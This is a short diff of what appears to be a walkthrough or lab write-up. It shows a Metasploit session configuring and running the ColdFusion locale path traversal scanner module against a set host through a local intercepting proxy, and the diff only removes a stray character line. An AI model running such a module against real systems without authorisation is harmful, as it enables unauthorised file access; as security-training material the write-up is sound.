@@ -318,7 +318,6 @@ RHOST => 45.33.32.156
 msf6 auxiliary(scanner/http/coldfusion_locale_traversal) > set Proxies http:127.0.0.1:8080
 Proxies => http:127.0.0.1:8080
 msf6 auxiliary(scanner/http/coldfusion_locale_traversal) > exploit
-▆
 ```
 
 Looking at the intercepted request, we get the answer.
